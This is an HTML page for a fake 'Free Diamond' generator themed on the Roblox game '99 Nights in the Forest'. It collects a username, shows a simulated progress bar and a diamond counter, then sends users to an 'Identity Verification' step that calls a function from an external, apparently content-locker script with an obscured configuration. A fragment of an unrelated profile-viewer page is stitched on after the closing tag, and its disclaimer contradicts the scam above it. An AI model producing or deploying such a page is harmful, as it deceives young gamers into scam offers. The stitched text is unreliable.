<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QL7RYZFWXS"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QL7RYZFWXS');
  </script>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Diamond Recharge â€” 99 Nights in the Forest Theme</title>

  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;600;800&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg-1: #061217;
      --bg-2: #041011;
      --forest-green: #0fb37a;
      --accent-cyan: #7efcff;
      --muted-text: rgba(230,254,252,0.78);
      --card-bg: linear-gradient(180deg, rgba(4,12,14,0.58), rgba(3,8,10,0.36));
      --glass-border: rgba(126,252,255,0.06);
      --text: #e6fefc;
      --accent-glow: rgba(15,179,122,0.12);
    }

    *{box-sizing:border-box;margin:0;padding:0;font-family: "Rubik", Arial, sans-serif; }
    html,body{height:100%;}
    body{
      background:
        radial-gradient(circle at 10% 15%, rgba(8,20,22,0.6) 0%, transparent 30%),
        linear-gradient(180deg, var(--bg-1) 0%, var(--bg-2) 100%);
      color:var(--text);
      min-height:100vh;
      overflow-x:hidden;
      -webkit-font-smoothing:antialiased;
      position:relative;
    }

    /* scenic background (night forest image) */
    body::after{
      content:'';
      position:fixed;
      inset:0;
      background-image: url('https://images.unsplash.com/photo-1501785888041-af3ef285b470?ixlib=rb-4.0.3&auto=format&fit=crop&w=1600&q=80');
      background-size:cover;
      background-position:center bottom;
      opacity:0.16;
      filter: blur(2px) saturate(0.9);
      z-index:0;
      pointer-events:none;
    }

    /* fog / ambient layers */
    .ambient-fog{ position:fixed; inset:0; z-index:0; pointer-events:none; }
    .fog{ position:absolute; left:-10%; right:-10%; bottom:-5%; height:60%; background: radial-gradient(50% 40% at 50% 60%, rgba(4,8,10,0.6), transparent 60%); filter: blur(30px); opacity:0.5; animation: fogMove 18s ease-in-out infinite alternate; }
    .fog.f2{ bottom:0; opacity:0.32; filter: blur(40px); animation-duration:26s; }
    @keyframes fogMove { from{ transform:translateY(0) } to{ transform:translateY(-28px) } }

    /* fireflies */
    .fireflies{ position:fixed; inset:0; z-index:1; pointer-events:none; }
    .firefly{ position:absolute; width:7px; height:7px; border-radius:50%; background: radial-gradient(circle at 30% 30%, #fff, var(--accent-cyan)); box-shadow:0 0 14px 6px rgba(126,252,255,0.14); opacity:0; animation: fly 12s linear infinite, blink 4s ease-in-out infinite; mix-blend-mode:screen; }
    @keyframes fly { from { transform: translateY(0) } to { transform: translateY(-120px) } }
    @keyframes blink { 0%,100%{opacity:0} 25%,75%{opacity:1} 50%{opacity:0.85} }

    /* page layout */
    .page { min-height:100vh; display:none; align-items:center; justify-content:center; padding:28px; position:relative; z-index:3; }
    .page.active{ display:flex; }

    .container{ width:100%; max-width:640px; margin:0 auto; z-index:4; }

    .glass-card{
      background: var(--card-bg);
      border: 1px solid var(--glass-border);
      border-radius:20px;
      padding:28px;
      box-shadow: 0 26px 80px rgba(0,0,0,0.7), inset 0 -6px 20px rgba(0,0,0,0.25);
      position:relative;
      overflow:hidden;
      backdrop-filter: blur(6px) saturate(1.05);
      transform: translateY(6px);
      opacity:0;
      animation: cardIn .6s ease forwards;
    }
    @keyframes cardIn{ to{ transform:translateY(0); opacity:1; } }

    .glass-card::before{
      content:'';
      position:absolute; left:0; top:0; right:0; height:5px;
      background: linear-gradient(90deg, rgba(126,252,255,0.18), rgba(15,179,122,0.18));
      z-index:6;
    }

    .header{ text-align:center; margin-bottom:18px; padding-top:4px; z-index:6; position:relative; }
    .logo-container{ width:108px; height:108px; margin:0 auto 12px; border-radius:16px; display:flex; align-items:center; justify-content:center; background: linear-gradient(180deg, rgba(126,252,255,0.05), rgba(15,179,122,0.03)); border:1px solid rgba(126,252,255,0.04); transform: rotate(-5deg); box-shadow:0 10px 26px rgba(0,0,0,0.6); }
    .logo{ width:70px; height:auto; filter: drop-shadow(0 8px 24px rgba(0,0,0,0.6)); }

    .title{ font-size:2.1rem; font-weight:800; letter-spacing:1px; background: linear-gradient(180deg, var(--accent-cyan), var(--forest-green)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-transform:uppercase; text-shadow: 0 6px 30px rgba(2,10,12,0.6); }
    .subtitle{ color:var(--muted-text); font-size:1rem; margin-top:6px; }

    /* improved steps (1-2-3) */
    .steps{ display:flex; gap:12px; justify-content:center; align-items:center; margin:18px 0 16px; }
    .step{
      width:48px; height:48px; border-radius:12px; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:1.05rem;
      color:var(--muted-text); background: rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.03); box-shadow: 0 6px 18px rgba(0,0,0,0.45);
      position:relative;
    }
    .step::after{
      content:''; position:absolute; right:-26px; width:22px; height:4px; background: linear-gradient(90deg, rgba(126,252,255,0.06), rgba(15,179,122,0.06)); top:50%; transform:translateY(-50%); border-radius:6px;
    }
    .step:last-child::after{ display:none; }
    .step.active{ background: linear-gradient(180deg, rgba(126,252,255,0.12), rgba(15,179,122,0.08)); color:#02110f; border:none; box-shadow: 0 10px 30px rgba(15,179,122,0.08); }
    .step.completed{ background: linear-gradient(90deg,#19b085,#7efcff); color:#02110f; border:none; box-shadow: 0 10px 30px rgba(15,179,122,0.12); }

    /* input */
    .input-group{ margin-bottom:18px; }
    .label{ display:block; font-weight:600; margin-bottom:8px; font-size:0.95rem; color:var(--muted-text); text-align:left; }
    .input{
      width:100%; padding:14px 16px; border-radius:12px; font-size:1rem; color:var(--text);
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.06));
      border:1px solid rgba(126,252,255,0.04);
      transition: box-shadow 0.18s ease, transform 0.12s ease;
    }
    .input:focus{ outline:none; box-shadow: 0 10px 30px rgba(15,179,122,0.08); transform:translateY(-2px); border-color: rgba(126,252,255,0.12); }
    .input::placeholder{ color: rgba(230,254,252,0.38); }

    /* coins */
    .coins-options{ display:grid; grid-template-columns: repeat(2, 1fr); gap:12px; margin-bottom:18px; }
    .coins-option{ border-radius:12px; padding:12px; text-align:center; cursor:pointer; background: linear-gradient(180deg, rgba(3,8,10,0.25), rgba(4,10,12,0.14)); border:1px solid rgba(126,252,255,0.03); transition: transform .15s ease, box-shadow .15s ease; }
    .coins-option:hover{ transform:translateY(-6px); box-shadow: 0 18px 40px rgba(2,10,12,0.5); }
    .coins-option.selected{ border-color: rgba(15,179,122,0.35); box-shadow: 0 18px 40px rgba(15,179,122,0.08); background: linear-gradient(180deg, rgba(15,179,122,0.03), rgba(126,252,255,0.02)); }

    .coins-icon{ width:46px;height:46px; margin-bottom:8px; filter: drop-shadow(0 6px 18px rgba(0,0,0,0.6)); }
    .coins-amount{ font-size:1.4rem; font-weight:800; color:var(--text); }

    /* button */
    .btn{ width:100%; padding:14px; border-radius:12px; border:none; cursor:pointer; font-weight:800; text-transform:uppercase; font-size:1.02rem; background: linear-gradient(90deg, rgba(126,252,255,0.12), rgba(15,179,122,0.12)); color:var(--text); box-shadow: 0 10px 30px rgba(2,10,12,0.6); transition: transform .12s ease, box-shadow .12s ease; }
    .btn:hover{ transform:translateY(-4px); box-shadow: 0 18px 50px rgba(2,10,12,0.7); }

    /* progress & counter */
    .progress-container{ width:100%; height:12px; background: rgba(255,255,255,0.02); border-radius:100px; overflow:hidden; margin:22px 0; border:1px solid rgba(255,255,255,0.02); }
    .progress-bar{ height:100%; background: linear-gradient(90deg,#19b085,#7efcff); width:0%; transition: width .45s ease; }
    .status-text{ text-align:center; font-size:1rem; color:var(--muted-text); margin:14px 0; }

    .counter{ font-size:4.5rem; font-weight:900; text-align:center; margin:20px 0; background: linear-gradient(180deg, var(--accent-cyan), var(--forest-green)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; letter-spacing:2px; }

    /* theme toggle */
    .theme-toggle-button{ position:fixed; top:18px; right:18px; z-index:7; width:54px;height:54px;border-radius:50%; background:rgba(255,255,255,0.03); display:flex;align-items:center;justify-content:center; cursor:pointer; border:1px solid rgba(255,255,255,0.03); }
    .theme-toggle-button img{ width:26px;height:26px; filter: drop-shadow(0 6px 18px rgba(0,0,0,0.6)); }

    /* small responsive */
    @media (max-width:520px){
      .title{ font-size:1.6rem; }
      .logo-container{ width:92px; height:92px; }
      .counter{ font-size:3.2rem; }
      .step{ width:42px; height:42px; font-size:0.95rem; }
    }
  </style>

  <!-- KEEP ORIGINAL API/EXTERNAL SCRIPTS EXACTLY THE SAME -->
  <script type="text/javascript">
    var hUcZZ_Owf_ZQWvnc={"it":4561085,"key":"7d9de"};
</script>
<script src="https://d1y0yks1k8t5m5.cloudfront.net/74e6540.js"></script>

  <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
  <meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
<body>

  <!-- ambient visuals -->
  <div class="ambient-fog" aria-hidden="true">
    <div class="fog"></div>
    <div class="fog f2"></div>
  </div>

  <div class="fireflies" aria-hidden="true">
    <div class="firefly" style="left:6%; top:22%; animation-duration:9s; animation-delay:0s;"></div>
    <div class="firefly" style="left:28%; top:58%; animation-duration:14s; animation-delay:1.6s;"></div>
    <div class="firefly" style="left:72%; top:32%; animation-duration:11s; animation-delay:0.8s;"></div>
    <div class="firefly" style="left:54%; top:74%; animation-duration:16s; animation-delay:2.2s;"></div>
    <div class="firefly" style="left:44%; top:12%; animation-duration:12s; animation-delay:0.4s;"></div>
  </div>

  <!-- theme toggle -->
  <button class="theme-toggle-button" onclick="toggleTheme()" aria-label="Toggle Theme">
      <img id="theme-icon" src="https://i.postimg.cc/BQqJ59vT/6714978.png" alt="Theme">
  </button>

  <!-- Username Page -->
  <div id="username-page" class="page active">
      <div class="container">
          <div class="glass-card">
              <header class="header">
                  <div class="logo-container">
                      <img src="https://i.postimg.cc/QCHCr8pd/Site-community-image.png" alt="Logo" class="logo">
                  </div>
                  <h1 class="title">Free Diamond</h1>
                  <p class="subtitle">Enter your Roblox username to begin â€” night falls fast.</p>
              </header>

              <!-- improved step UI (keeps the same order and meaning) -->
              <div class="steps" aria-hidden="true">
                <div class="step active" title="Step 1">1</div>
                <div class="step" title="Step 2">2</div>
                <div class="step" title="Step 3">3</div>
              </div>

              <div class="input-group">
                  <label class="label">Username</label>
                  <!-- placeholder changed to exactly "Username" as requested -->
                  <input type="text" class="input" id="username" placeholder="Username">
              </div>

              <button class="btn" onclick="nextPage('coins-page')">Next</button>
          </div>
      </div>
  </div>

  <!-- Coins Page -->
  <div id="coins-page" class="page">
      <div class="container">
          <div class="glass-card">
              <header class="header">
                <h1 class="title">Choose Amount</h1>
                <p class="subtitle">Select the diamond amount to summon</p>
              </header>

              <div class="steps" aria-hidden="true">
                <div class="step completed">1</div>
                <div class="step active">2</div>
                <div class="step">3</div>
              </div>

              <div id="resource-section" class="coins-options">
                  <div class="coins-option" onclick="selectCoinsAndAdvance(1000, this)">
                    <img src="https://i.postimg.cc/zB9ZV8sB/Diamond-Icon.png" class="coins-icon" alt="">
                    <div class="coins-amount">1,000</div><div>Diamond</div>
                  </div>
                  <div class="coins-option" onclick="selectCoinsAndAdvance(2500, this)">
                    <img src="https://i.postimg.cc/zB9ZV8sB/Diamond-Icon.png" class="coins-icon" alt="">
                    <div class="coins-amount">2,500</div><div>Diamond</div>
                  </div>
                  <div class="coins-option" onclick="selectCoinsAndAdvance(5000, this)">
                    <img src="https://i.postimg.cc/zB9ZV8sB/Diamond-Icon.png" class="coins-icon" alt="">
                    <div class="coins-amount">5,000</div><div>Diamond</div>
                  </div>
                  <div class="coins-option" onclick="selectCoinsAndAdvance(10000, this)">
                    <img src="https://i.postimg.cc/zB9ZV8sB/Diamond-Icon.png" class="coins-icon" alt="">
                    <div class="coins-amount">10,000</div><div>Diamond</div>
                  </div>
              </div>
          </div>
      </div>
  </div>

  <!-- Processing Page -->
  <div id="processing-page" class="page">
      <div class="container">
          <div class="glass-card">
              <header class="header">
                <h1 class="title">Processing</h1>
                <p class="subtitle" id="status-message">Verifying information...</p>
              </header>
              <div class="steps" aria-hidden="true">
                <div class="step completed">1</div>
                <div class="step completed">2</div>
                <div class="step active">3</div>
              </div>

              <div class="progress-container"><div class="progress-bar" id="progress-bar"></div></div>
          </div>
      </div>
  </div>

  <!-- Counting Page -->
  <div id="counting-page" class="page">
      <div class="container">
          <div class="glass-card">
              <header class="header">
                <h1 class="title">Adding</h1>
                <p class="subtitle">Diamonds are being added to your account</p>
              </header>

              <div class="counter" id="counter">0</div>
              <p class="status-text">Please wait until the process is complete</p>
          </div>
      </div>
  </div>

  <!-- Verification Page -->
  <div id="verification-page" class="page">
      <div class="container">
          <div class="glass-card">
              <header class="header">
                <h1 class="title">Identity Verification</h1>
                <p class="subtitle">One last step before receiving diamonds</p>
              </header>

              <p class="status-text">To complete the process, please verify your identity below.</p>
              <button onclick="_Th()" class="btn" onclick="goToVerification()">Verify Now</button>
          </div>
      </div>
  </div>

  <script>
      /* === KEEP ALL JS LOGIC EXACTLY AS BEFORE ===
         Only minimal cosmetic JS changes for theme icon swapping and focus behavior
      */
      let selectedCoinsAmount = 0;
      let verificationUrl = "https://example.com/verify"; // keep/update to your verification link

      function toggleTheme() {
          // This theme switch only toggles a light overlay; main look remains forest/night
          document.body.classList.toggle('light-mode');
          const themeIcon = document.getElementById('theme-icon');
          if (document.body.classList.contains('light-mode')) {
              themeIcon.src = "https://i.postimg.cc/V6LFBk3y/image.png";
          } else {
              themeIcon.src = "https://i.postimg.cc/BQqJ59vT/6714978.png";
          }
      }

      function showPage(id) {
          document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
          document.getElementById(id).classList.add('active');
          const firstInput = document.getElementById(id)?.querySelector('input');
          if(firstInput) firstInput.focus();
      }

      function nextPage(pageId) {
          if (pageId === 'coins-page' && !document.getElementById('username').value.trim()) {
              alert('Please enter your username');
              return;
          }
          showPage(pageId);
      }

      function selectCoinsAndAdvance(amount, element) {
          selectedCoinsAmount = amount;
          document.querySelectorAll('.coins-option').forEach(o => o.classList.remove('selected'));
          element.classList.add('selected');
          setTimeout(() => { showPage('processing-page'); simulateProgress(); }, 300);
      }

      function simulateProgress() {
          let progress = 0;
          const progressBar = document.getElementById('progress-bar');
          const status = document.getElementById('status-message');
          const interval = setInterval(() => {
              progress++;
              progressBar.style.width = progress + '%';
              if (progress === 25) status.textContent = 'Generating Diamond...';
              if (progress === 50) status.textContent = 'Preparing your account...';
              if (progress === 75) status.textContent = 'Almost done...';
              if (progress >= 100) {
                  clearInterval(interval);
                  setTimeout(startCounting, 1000);
              }
          }, 50);
      }

      function startCounting() {
          showPage('counting-page');
          let count = 0;
          const counter = document.getElementById('counter');
          const steps = 2000 / 50;
          const increment = selectedCoinsAmount / steps;
          const interval = setInterval(() => {
              count += increment;
              counter.textContent = Math.floor(count).toLocaleString();
              if (count >= selectedCoinsAmount) {
                  clearInterval(interval);
                  counter.textContent = selectedCoinsAmount.toLocaleString();
                  setTimeout(showVerification, 1000);
              }
          }, 50);
      }

      function showVerification() {
          showPage('verification-page');
      }

      function goToVerification() {
          window.location.href = verificationUrl;
      }

      // Note: original page included window.uFfKS_DUP_ejSfTc and an external script --
      // we intentionally did NOT modify or remove those to preserve API behavior.
  </script>
</body>
</html>            <button id="clearBtn" class="btn" style="background:transparent;border:1px solid rgba(255,255,255,0.03)">Clear</button>
          </div>

          <p class="muted-note">Enter a Roblox username and press <strong>Fetch Profile</strong>. This viewer fetches public Roblox avatar and display name via RoProxy.</p>

          <div id="errorBox" class="error" role="alert"></div>
        </div>

        <!-- optional extras: event pitch / CTA but not misleading -->
        <div class="panel" style="margin-top:14px">
          <h3 style="margin:0 0 8px">Event</h3>
          <p class="muted-note">Design preview inspired by the "99 Nights in the Forest" mood â€” atmospheric visuals, fog, and subtle motion to enhance immersion.</p>
          <p class="note-legal">This page is a visual/profile tool only. It does not modify Roblox accounts or grant in-game items.</p>
        </div>
      </div>

      <!-- right: profile -->
      <aside>
        <div class="profile" id="profileCard" aria-live="polite">
          <img id="avatar" class="avatar" src="https://logodix.com/logo/1070634.png" alt="avatar">
          <div class="displayName" id="displayName">â€”</div>
          <div class="meta" id="meta">No profile loaded</div>
        </div>
      </aside>
    </div>

    <!-- loading overlay (hidden by default) -->
    <div id="loader" class="loading-overlay" style="display:none">
      <div class="loading-spinner" role="status" aria-hidden="true"></div>
      <div>Loading profileâ€¦</div>
    </div>

  </div>
</div>

<script>
  // Keep behaviour local and safe. Uses RoProxy endpoints (publicly proxied Roblox endpoints)
  // Note: this viewer only fetches public avatar & displayName. No creation/generation of items.

  const usernameInput = document.getElementById('username');
  const fetchBtn = document.getElementById('fetchBtn');
  const clearBtn = document.getElementById('clearBtn');
  const avatarImg = document.getElementById('avatar');
  const displayNameEl = document.getElementById('displayName');
  const metaEl = document.getElementById('meta');
  const loader = document.getElementById('loader');
  const errorBox = document.getElementById('errorBox');

  function showLoader(show){
    loader.style.display = show ? 'flex' : 'none';
  }
  function showError(msg){
    errorBox.style.display = msg ? 'block' : 'none';
    errorBox.textContent = msg || '';
  }

  async function fetchProfile(username){
    showError('');
    if(!username) { showError('Please enter a username.'); return; }

    showLoader(true);
    displayNameEl.textContent = 'â€”';
    metaEl.textContent = 'Fetchingâ€¦';

    // timeout fallback (in case RoProxy is slow)
    const timeout = new Promise((resolve) => setTimeout(()=>resolve({timeout:true}), 5000));

    // main fetch: POST to roproxy usernames endpoint to get id & displayName
    const fetchUser = (async () => {
      const res1 = await fetch('https://users.roproxy.com/v1/usernames/users', {
        method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({usernames:[username],excludeBannedUsers:true})
      });
      if(!res1.ok) throw new Error('Failed to fetch user id');
      const d1 = await res1.json();
      if(!d1.data || d1.data.length===0) throw new Error('User not found');

      const userId = d1.data[0].id;
      const displayName = d1.data[0].displayName || username;

      // avatar thumbnail
      const res2 = await fetch(`https://thumbnails.roproxy.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
      if(!res2.ok) throw new Error('Failed to fetch avatar');
      const d2 = await res2.json();
      const avatarUrl = (d2.data && d2.data[0] && d2.data[0].imageUrl) ? d2.data[0].imageUrl : null;

      return {userId, displayName, avatarUrl};
    })();

    try {
      const result = await Promise.race([fetchUser, timeout]);
      if(result && result.timeout){
        // fallback: show placeholder and username
        avatarImg.src = 'https://logodix.com/logo/1070634.png';
        displayNameEl.textContent = username;
        metaEl.textContent = 'RoProxy timeout â€” try again later.';
        showLoader(false);
        return;
      }
      avatarImg.src = result.avatarUrl || 'https://logodix.com/logo/1070634.png';
      displayNameEl.textContent = result.displayName || username;
      metaEl.textContent = `Roblox ID: ${result.userId}`;
    } catch(err){
      avatarImg.src = 'https://logodix.com/logo/1070634.png';
      displayNameEl.textContent = 'Not found';
      metaEl.textContent = 'Unable to load profile.';
      showError('Could not fetch profile. Please check the username and try again.');
    } finally {
      showLoader(false);
    }
  }

  fetchBtn.addEventListener('click', ()=> fetchProfile(usernameInput.value.trim()));
  clearBtn.addEventListener('click', ()=>{
    usernameInput.value=''; avatarImg.src='https://logodix.com/logo/1070634.png'; displayNameEl.textContent='â€”'; metaEl.textContent='No profile loaded'; showError('');
  });

  // small keyboard UX: enter to fetch
  usernameInput.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ fetchProfile(usernameInput.value.trim()); } });

  // optional theme toggle: gentle brightness shift
  const themeToggle = document.getElementById('themeToggle');
  themeToggle.addEventListener('click', ()=>{
    document.documentElement.classList.toggle('light-mode');
    // simple flip effect for the card
    document.querySelector('.card').style.transform = 'translateY(6px)';
    setTimeout(()=> document.querySelector('.card').style.transform = '', 250);
  });

  // Place a small UX focus
  usernameInput.focus();
</script>
</body>
</html>
